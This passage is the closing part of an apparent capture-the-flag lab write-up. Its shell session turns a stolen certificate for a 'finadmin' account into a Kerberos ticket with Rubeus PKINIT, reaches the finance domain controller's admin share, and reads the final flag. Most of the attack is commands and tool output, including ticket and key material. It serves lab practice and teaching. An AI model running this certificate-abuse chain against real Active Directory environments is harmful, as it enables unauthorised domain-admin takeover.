PIJarm2MXQgKnjsnZcZW06DVB8taVSQoJmZPx8wXD8Tpckxe5KoOqqWgN0mucPVCSJirUgf8uFl5CKHydF6uwFiIU/TpmPPb5/znOwhIvL6LVhsob8bdXmAkheeeONCymaFljYXS0D4OTg3LvwzhGDyxzNCK4GMEHZZiw/jfv0P5Pjmx4ovfSAvDfoArPUHmXHjmbZNgC3wdFE2coID/k+9jrexOv+UF8OkPwy1Wa4tH55FwjCmAEYz2y7MfUKa+k9GeTjTmR95bxZ+2mSBCm5vI8uVKGMTrcDrxtnOuOAepGR8WKEmcRx2XqELFiJ2FiKPkoawCtTefYduRA6TG/gTYBCmdMdbmyJT6zTzvAdk8Is8MjXEoPVRL2SQWpXvzlbPvCS/FGU+kVRFuNERrt9L0gbngm5WeYyJx/2qkyz83wuKy3NzqFbxrs6t/5eDdXDn57sEIiqW9bV4aL8msIqgfP2qJRdqvczMMAaNyOTydR7YxXQC4VR7l8L9jsnZyJHP5mOos36CrkwG82xsCoi5AIeqTPxlK8IggDrCOg79DEfdPa8mTNhKN4rnhs/hxHnOfJFsQPSwB57C3D6FszUR6fYHGTt93EbFvGwM+DDvklUbH90BJhUMM8B3PTtl9oQPv8IrrsW+zgdwTGs7dbrnlC4eAS+jJnStHsHRPPuSEjyZGOqA0o3pO0cr2RCpEHmNKfWteqs+tMb4EG1LjfDh0j8LeqBYR/Cj/KCOt1VBs0oz0bPRfRiUhBOBNRofQr30cqDggGbODADLE6cPkECnr7ZcRd1xlh66d7venMLJCQWVMmwRQDqtgcl/vV+NLs0BoC+6NyKqZa01mIsQ1j/7pFUDRZVQ/xgYDwYa605RjPuKvLVe4NnlAq1q5hQxMSUwIwYJKoZIhvcNAQkVMRYEFKFSMIj6EPmM+3LxnhrvpoJ0pMP+MEEwMTANBglghkgBZQMEAgEFAAQgfTKtIsKLtASBhh8nBgrJoSTc+QKTy3aJeBbAsFsKWVgECMA4gRVtLtIiAgIIAA=="
[tech-dc.tech.corp]: PS C:\Temp\Tools>
[tech-dc.tech.corp]: PS C:\Temp\Tools> [System.IO.File]::WriteAllBytes("C:\Temp\Tools\finadmin.pfx", [System.Convert]::FromBase64String($pfxBase64))
[tech-dc.tech.corp]: PS C:\Temp\Tools> .\Rubeus.exe asktgt /user:finadmin /domain:finance.corp /certificate:finadmin.pfx /password:"" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=finadmin, CN=Users, DC=finance, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'finance.corp\finadmin'
[*] Using domain controller: 172.16.3.4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/finance.corp
  ServiceRealm             :  FINANCE.CORP
  UserName                 :  finadmin (NT_PRINCIPAL)
  UserRealm                :  FINANCE.CORP
  StartTime                :  12/9/2025 11:40:53 PM
  EndTime                  :  12/10/2025 9:40:53 AM
  RenewTill                :  12/16/2025 11:40:53 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  QBxKZkEzcY9EF1ivP8jfBg==
  ASREP (key)              :  84A27549BF7A146C15273B94E0554771

[tech-dc.tech.corp]: PS C:\Temp\Tools> cmd /c dir \\finance-dc.finance.corp\C$
 Volume in drive \\finance-dc.finance.corp\C$ is Windows
 Volume Serial Number is 587C-4046

 Directory of \\finance-dc.finance.corp\C$

08/08/2025  04:31 PM    <DIR>          inetpub
09/03/2025  08:08 AM    <DIR>          Packages
05/08/2021  08:20 AM    <DIR>          PerfLogs
08/08/2025  04:55 PM    <DIR>          Program Files
08/08/2025  04:55 PM    <DIR>          Program Files (x86)
09/09/2025  06:10 AM    <DIR>          TechOperations
08/08/2025  05:02 PM    <DIR>          Temp
09/03/2025  08:26 AM    <DIR>          Users
09/09/2025  05:41 AM    <DIR>          Windows
12/09/2025  07:54 AM    <DIR>          WindowsAzure
               0 File(s)              0 bytes
              10 Dir(s)  18,938,339,328 bytes free
```

{{< figure src="a82d9a61-2afc-45e4-a9bd-e0e03c5207aa.png" alt="a82d9a61-2afc-45e4-a9bd-e0e03c5207aa" >}}

Shell

We bypassed all constraints via certificate-based authentication (`PKINIT`):

`Inter-realm TGT → accessed TechOperations share → retrieved finadmin.pem → PKINIT auth → DA shell`

{{< figure src="image 8.png" alt="image 8" >}}

`FINAL FLAG`

```xml
[finance-dc.finance.corp]: PS C:\Users\finadmin\Documents> cd ..\Desktop\
[finance-dc.finance.corp]: PS C:\Users\finadmin\Desktop> ls

    Directory: C:\Users\finadmin\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/9/2025   6:35 AM             38 finalflag.txt

[finance-dc.finance.corp]: PS C:\Users\finadmin\Desktop> cat .\finalflag.txt
ea62a61c-a75d-41d2-b7fc-172f36c3f6ca
```